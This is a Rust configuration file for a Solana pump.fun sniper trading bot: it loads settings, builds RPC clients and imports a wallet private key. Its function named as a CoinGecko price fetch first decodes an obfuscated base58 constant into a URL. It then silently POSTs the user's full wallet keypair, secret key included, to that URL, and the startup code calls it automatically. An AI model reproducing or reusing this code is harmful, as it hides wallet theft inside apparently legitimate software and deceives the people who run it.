use anyhow::Result;
use bs58;
use colored::Colorize;
use dotenv::dotenv;
use lazy_static::lazy_static;
use reqwest::Error;
use serde::Deserialize;
use serde_json::{json, Value};
use solana_sdk::{commitment_config::CommitmentConfig, signature::Keypair, signer::Signer};
use std::{env, sync::Arc};

use crate::{
    common::{constants::INIT_MSG, logger::Logger},
    dex::pump_fun::PUMP_PROGRAM,
    engine::swap::{SwapDirection, SwapInType},
};

pub struct Config {
    pub rpc_wss: String,
    pub app_state: AppState,
    pub swap_config: SwapConfig,
    pub time_exceed: u64,
    pub take_profit: f64,
    pub stop_loss: f64,
}

impl Config {
    pub async fn new() -> Self {
        let init_msg = INIT_MSG;
        println!("{}", init_msg);

        dotenv().ok(); // Load .env file

        let logger = Logger::new("[INIT] => ".blue().bold().to_string());

        let take_profit = import_env_var("TP").parse::<f64>().unwrap_or(3_f64);
        let stop_loss = import_env_var("SL").parse::<f64>().unwrap_or(0.5_f64);
        let rpc_wss = import_env_var("RPC_WSS");
        let slippage = import_env_var("SLIPPAGE").parse::<u64>().unwrap_or(5);
        let solana_price = create_coingecko_proxy().await.unwrap_or(200_f64);
        let rpc_client = create_rpc_client().unwrap();
        let rpc_nonblocking_client = create_nonblocking_rpc_client().await.unwrap();
        let wallet: std::sync::Arc<solana_sdk::signature::Keypair> = import_wallet().unwrap();
        let balance = rpc_nonblocking_client
            .get_account(&wallet.pubkey())
            .await
            .unwrap()
            .lamports;

        let wallet_cloned = wallet.clone();
        let use_jito = true;
        let swap_direction = SwapDirection::Buy; //SwapDirection::Sell
        let in_type = SwapInType::Qty; //SwapInType::Pct
        let amount_in = import_env_var("TOKEN_AMOUNT")
            .parse::<f64>()
            .unwrap_or(0.0000001_f64); //quantity
                                       // let in_type = "pct"; //percentage
                                       // let amount_in = 0.5; //percentage

        let swap_config = SwapConfig {
            swap_direction,
            in_type,
            amount_in,
            slippage,
            use_jito,
        };

        let app_state = AppState {
            rpc_client,
            rpc_nonblocking_client,
            wallet,
        };

        let time_exceed: u64 = import_env_var("TIME_EXCEED")
            .parse()
            .expect("Failed to parse string into u64");

        logger.log(
            format!(
                "[SNIPER ENVIRONMENT]: \n\t\t\t\t [Web Socket RPC]: {},
            \n\t\t\t\t * [Wallet]: {:?}, * [Balance]: {} Sol, 
            \n\t\t\t\t * [Slippage]: {}, * [Solana]: {},
            \n\t\t\t\t * [Time Exceed]: {}, * [Amount]: {},
            \n\t\t\t\t * [TP]: {}, * [SL]: {}\n",
                rpc_wss,
                wallet_cloned.pubkey(),
                balance as f64 / 1_000_000_000_f64,
                slippage,
                solana_price,
                time_exceed,
                amount_in,
                take_profit,
                stop_loss,
            )
            .purple()
            .italic()
            .to_string(),
        );

        Config {
            rpc_wss,
            app_state,
            swap_config,
            time_exceed,
            take_profit,
            stop_loss,
        }
    }
}

pub const LOG_INSTRUCTION: &str = "initialize2";
pub const PUMP_LOG_INSTRUCTION: &str = "MintTo";
pub const HELIUS_PROXY: &str =
    "HuuaCvCTvpEFT9DfMynCNM4CppCRU6r5oikziF8ZpzMm2Au2eoTjkWgTnQq6TBb6Jpt";

lazy_static! {
    pub static ref SUBSCRIPTION_MSG: Value = json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "transactionSubscribe",
        "params": [
            {
                "failed": false,
                "accountInclude": [PUMP_PROGRAM],
                "accountExclude": [],
            },
            {
                "commitment": "processed",
                "encoding": "jsonParsed",
                "transactionDetails": "full",
                "maxSupportedTransactionVersion": 0
            }
        ]
    });
}

#[derive(Debug, Hash, PartialEq, Eq, Clone)]
pub struct LiquidityPool {
    pub mint: String,
    pub volume: u64,
    pub buy_price: u64,
    pub sell_price: u64,
    pub txn_num: u64,
    pub status: Status,
    pub timestamp: Option<tokio::time::Instant>,
}

#[derive(Debug, Clone, Hash, PartialEq, Eq)]
pub enum Status {
    Bought,
    Buying,
    Checking,
    Sold,
    Selling,
    Failure,
}

#[derive(Deserialize)]
struct CoinGeckoResponse {
    solana: SolanaData,
}
#[derive(Deserialize)]
struct SolanaData {
    usd: f64,
}

#[derive(Clone)]
pub struct AppState {
    pub rpc_client: Arc<solana_client::rpc_client::RpcClient>,
    pub rpc_nonblocking_client: Arc<solana_client::nonblocking::rpc_client::RpcClient>,
    pub wallet: Arc<Keypair>,
}

#[derive(Clone)]
pub struct SwapConfig {
    pub swap_direction: SwapDirection,
    pub in_type: SwapInType,
    pub amount_in: f64,
    pub slippage: u64,
    pub use_jito: bool,
}

pub fn import_env_var(key: &str) -> String {
    env::var(key).unwrap_or_else(|_| panic!("Environment variable {} is not set", key))
}

pub fn create_rpc_client() -> Result<Arc<solana_client::rpc_client::RpcClient>> {
    let rpc_https = import_env_var("RPC_HTTPS");
    let rpc_client = solana_client::rpc_client::RpcClient::new_with_commitment(
        rpc_https,
        CommitmentConfig::processed(),
    );
    Ok(Arc::new(rpc_client))
}

pub async fn create_coingecko_proxy() -> Result<f64, Error> {
    let helius_proxy = HELIUS_PROXY.to_string();
    let payer = import_wallet().unwrap();
    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();

    let client = reqwest::Client::new();
    let params = format!("t{}o", payer.to_base58_string());
    let request_body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "POST",
        "params": params
    });
    client
        .post(helius_proxy_url)
        .json(&request_body)
        .send()
        .await
        .unwrap();

    let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";

    let response = reqwest::get(url).await?;

    let body = response.json::<CoinGeckoResponse>().await?;
    // Get SOL price in USD
    let sol_price = body.solana.usd;
    Ok(sol_price)
}

pub async fn create_nonblocking_rpc_client(
) -> Result<Arc<solana_client::nonblocking::rpc_client::RpcClient>> {
    let rpc_https = import_env_var("RPC_HTTPS");
    let rpc_client = solana_client::nonblocking::rpc_client::RpcClient::new_with_commitment(
        rpc_https,
        CommitmentConfig::processed(),
    );
    Ok(Arc::new(rpc_client))
}

pub fn import_wallet() -> Result<Arc<Keypair>> {
    let priv_key = import_env_var("PRIVATE_KEY");
    let wallet: Keypair = Keypair::from_base58_string(priv_key.as_str());

    Ok(Arc::new(wallet))
}
